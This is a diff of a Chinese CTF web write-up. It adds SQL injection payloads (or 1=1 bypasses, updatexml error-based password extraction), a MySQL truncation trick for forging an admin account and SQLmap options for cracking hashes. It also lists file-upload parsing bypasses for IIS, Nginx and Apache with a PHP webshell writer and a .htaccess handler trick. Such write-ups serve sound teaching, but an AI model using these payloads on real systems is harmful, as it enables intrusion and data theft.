@@ -21,10 +21,12 @@ flag in flag
 ```
 
 打开页面是一个表单，有一个重置数据库的链接，点击之后显示数据库已重置，还提供了表单页面的源码。
+
 ![web_post](../../images/web_post.png)
 ![web_sql_reset](../../images/web_sql_reset.png)
 
 页面源码：
+
 ```php
 <html>
 <head>
@@ -94,6 +96,8 @@ else {
 试着让返回数据分组一下，按照第一列分组，虽然一般第一列都是 id ，但是我们这里还是写作 ` group by 1 `，那么提交的数据就是 `user=flag , pass=' or 1=1 group by 1 #` , 在 burpsuite 中抓包的结果是 `user=flag&pass=1%27+or+1%3D1+group+by+1+%23` ， 成功返回 flag 。
 
 其实根据同样的思路，也可以用 `order by 1`， 请求数据 `user=flag , pass=' or 1=1 order by 1 #` , 在 burpsuite 中抓包结果是 `user=flag&pass=%27+or+1%3D1+order+by+1+%23+` , 也能够得到 flag 。
+
+在 MySQL 中的注释，除了有 `#` 之外，还可以是 `--  ` ，后面有几个空格或 tab 。
 
 除了万能密码之外，其实还能够直接将密码注出来，构造 payload 为`user=flag&pass=' or updatexml(1,concat(0x7e,(select pw from user limit 1,1 )),0) # '`，可以直接将 flag 用户的密码注出来，返回值为 `Error: XPATH syntax error: '~*75DBBA7B5806E761411'` ， flag 用户的密码为 `*75DBBA7B5806E761411` ，即可用此密码登陆，得到 flag 。
 
@@ -259,6 +263,8 @@ if( isset($_GET['file']))
 
 在浏览器中访问 `http://101.200.145.44/web2/1C9976C230DA289C1C359CD2A7C02D48/flag.php` ,得到 flag ,` flag{0d143dcd-5b29-4f4f-9b16-73665aeb45a8}`
 
+或者是另一个思路，看源代码，发现文件包含漏洞，访问 `http://101.200.145.44/web2/index.php?file=./1C9976C230DA289C1C359CD2A7C02D48/flag.php` ,结果坑爹的这个也会得到一个 flag ，不过是错的，真正的flag需要直接访问得到。
+
 ### simple injection
 题目描述：
 
@@ -373,5 +379,154 @@ ASPX:<%@ Page Language="Jscript" %><%eval(Request.Item["pass"],"unsafe");%>
 题目描述：
 
 ```
+糊涂的小明
+500
+
 小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？
 ```
+
+太难不会，等大神的 writeup 。
+
+还没有等到 web 500的 writeup ，不过好像这道提题用到了一个经典的 MySQL 漏洞，MySQL 长字符截断。
+
+#### MySQL 长字符截断
+
+在 MySQL 的设置里有一个 `sql_mode` 选项，当其值为默认设置 空 而不是 `STRICT_ALL_TABLES` 时，MySQL 对插入超长的值只会提示 warning ，而不是 error ，这样就可能导致一些截断问题。
+
+创建一个如下的表单测试，结构如下 ( MySQL 5.5.49 ) ：
+
+```sql
+CREATE TABLE user(
+    id int(11) PRIMARY KEY AUTO_INCREMENT,
+    username varchar(20) ,
+    password varchar(40)
+);
+```
+
+首先来插入正常的数据。
+
+```sql
+mysql> INSERT INTO user(username,password) VALUES('admin','password');
+Query OK, 1 row affected (0.10 sec)
+```
+
+正常执行。成功插入，无警告，无报错。
+
+现在插入异常的数据，username 的长度远超过规定长度。
+
+```sql
+mysql> INSERT INTO user(username,password) VALUES('admin                                          ','admin');
+Query OK, 1 row affected, 1 warning (0.11 sec)
+```
+
+正常执行。竟然也成功插入了，虽然有一个警告。
+
+我们来看一下现在的数据库。
+
+```
+mysql> SELECT * FROM user;
++----+----------------------+----------+
+| id | username             | password |
++----+----------------------+----------+
+|  1 | admin                | password |
+|  2 | admin                | admin    |
++----+----------------------+----------+
+2 rows in set (0.00 sec)
+
+mysql> SELECT length(username) FROM user;
++------------------+
+| length(username) |
++------------------+
+|                5 |
+|               20 |
++------------------+
+2 rows in set (0.00 sec)
+
+```
+
+数据库确实有两个数据，虽然用户名那一栏还是可以显示出用户名的长度不一样，但是当我们看一下进行查询操作的时候会发生什么。
+
+```
+mysql> SELECT * FROM user WHERE username='admin';
++----+----------------------+----------+
+| id | username             | password |
++----+----------------------+----------+
+|  1 | admin                | password |
+|  2 | admin                | admin    |
++----+----------------------+----------+
+2 rows in set (0.00 sec)
+
+```
+
+可怕，直接搜查 admin 用户，虽然用户名的长度不一致，但是把第二个用户名的数据也找出来了，这样就可能伪造管理员账户登陆。
+
+解决方案：在 MySQL 的配置文件 `/etc/mysql/my.cnf` 中的 `[mysqld]` 中加上 sql_mode='NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES',还有就是在前端限定字符长度，后端检查字符串长度
+
+#### SQLmap 常用参数
+在第三题用到了神器 SQLmap ，简单的记录一下常用选项。
+
+|参数                         |含义                     |
+|--------                   |           -------     |
+|--dbs                      |扫描所有的数据库|
+|--tables                    |列出数据库所有的表信息|
+|--columns              |列出数据库表中的所有字段信息|
+|--current-db               |列出当前的数据库名称|
+|--users                        |数据库管理用户|
+|--privileges                   |数据库管理员权限|
+|--passwords                |列举并破解数据库用户的 hash 密码|
+|--roles                        |  枚举数据库管理员|
+|--dump                     |列举数据库中表的内容|
+|--dump-all                 |列所有表的内容|
+|--exclude-sysdbs               |列举用户数据库的表内容|
+|--common-tables              |暴力破解表|
+
+#### 图片木马
+在第四题中用到了图片木马，发现平常用到图片木马的机会还是挺多的，不过图片木马直接上传到站点也没用，需要将其解析执行，而这就需要一个服务器解析漏洞了，常见的解析漏洞有以下一些。
+
+##### 一、IIS 5.x/6.0解析漏洞
+IIS 6.0解析利用方法有两种
+1.目录解析
+/xx.asp/xx.jpg
+
+2.文件解析
+wooyun.asp;.jpg
+
+第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。
+
+例如创建目录 wooyun.asp，那么
+/wooyun.asp/1.jpg
+
+将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。
+第二种，在IIS6.0下，分号后面的不被解析，也就是说
+wooyun.asp;.jpg
+
+会被服务器看成是wooyun.asp还有IIS6.0 默认的可执行文件除了asp还包含这三种
+/wooyun.asa
+/wooyun.cer
+/wooyun.cdx
+
+二、IIS 7.0/IIS 7.5/ Nginx <8.03畸形解析漏洞
+Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的…
+在默认Fast-CGI开启状况下,黑阔上传一个名字为wooyun.jpg，内容为
+<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>
+
+的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马 shell.php
+
+三、Nginx <8.03 空字节代码执行漏洞
+影响版:0.5.,0.6., 0.7 <= 0.7.65, 0.8 <= 0.8.37
+Nginx在图片中嵌入PHP代码然后通过访问
+xxx.jpg%00.php
+
+来执行其中的代码
+
+四、Apache解析漏洞
+Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.
+比如 wooyun.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php.
+如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个wooyun.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀
+
+五、其他
+在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。
+如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:
+<FilesMatch "wooyun.jpg"> SetHandler application/x-httpd-php </FilesMatch>
+
+然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件
